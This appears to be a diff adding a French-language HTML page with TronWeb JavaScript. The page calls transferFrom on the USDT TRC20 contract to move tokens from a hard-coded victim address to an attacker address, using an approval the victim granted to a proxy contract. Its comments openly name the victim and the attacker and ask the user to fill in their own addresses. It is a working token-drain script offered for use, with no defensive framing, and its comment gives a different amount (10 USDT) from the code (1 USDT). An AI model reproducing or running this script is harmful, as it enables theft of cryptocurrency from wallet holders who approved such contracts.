@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Déclenchement transferFrom TRC20</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+</head>
+<body>
+  <h2>Exécuter transferFrom via ApproveProxy</h2>
+  <button id="transferBtn">Exécuter transferFrom</button>
+
+  <script>
+    // --- A PERSONNALISER ---
+    // Adresse TRON de la victime (celle qui a donné l'autorisation)
+    const victim = "TB21PeujGEM51zg9CnSpop6EaqZ6ccKx3T"; 
+
+    // Adresse TRON de l'attaquant (ton adresse qui va recevoir les tokens)
+    const attacker = "THRU2XfxP5vbUm6RPDpo3K7B12JVvYMD41"; 
+
+    // Adresse du token USDT TRC20 (contrat officiel)
+    const tokenContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+
+    // Adresse du smart contrat ApproveProxy (celui que la victime a approuvé)
+    const proxyContractAddress = "TAo4rwUGQovSD9F3qSeecUAsJsyzLetWpH";
+
+    // Connexion à TronLink (extension ou app mobile)
+    async function runTransferFrom() {
+      if (!window.tronWeb || !window.tronWeb.ready) {
+        alert("Veuillez vous connecter à TronLink !");
+        return;
+      }
+
+      const tronWeb = window.tronWeb;
+
+      // Instanciation du contrat USDT TRC20 (ERC20 compatible)
+      const tokenContract = await tronWeb.contract().at(tokenContractAddress);
+
+      try {
+        // Appel de la fonction transferFrom du token
+        // from: adresse de la victime (celle qui a donné l'autorisation)
+        // to: adresse de l'attaquant (celle qui reçoit les tokens)
+        // amount: montant à transférer (en sun, ici 10 USDT = 10 * 10^6)
+        const amount = 1 * 1_000_000; // 10 USDT, personnalise si besoin
+
+        const tx = await tokenContract.transferFrom(victim, attacker, amount).send({
+          feeLimit: 1_000_000,
+        });
+
+        alert("Transaction envoyée, txID : " + tx);
+      } catch (error) {
+        console.error("Erreur lors de transferFrom :", error);
+        alert("Erreur : " + error.message);
+      }
+    }
+
+    document.getElementById("transferBtn").addEventListener("click", runTransferFrom);
+  </script>
+</body>
+</html>
